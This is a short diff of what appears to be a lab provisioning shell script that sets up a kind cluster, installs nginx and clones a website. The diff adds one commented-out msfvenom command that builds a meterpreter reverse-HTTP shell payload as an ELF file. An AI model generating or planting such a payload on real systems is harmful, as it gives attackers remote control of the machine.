@@ -43,6 +43,8 @@ EOF
 
 #sudo kind create cluster --config=/home/laurijssen/kind.yaml
 
+# docker run raesene/metasploit ./msfvenom -p linux/x64/meterpreter_reverse_http LHOST=eth0 LPORT=8989 -f elf > reverse_shell.elf
+
 sudo apt-get install -y nginx
 
 sudo git -C /var/www/html clone https://github.com/nsevindi87/multipage-website
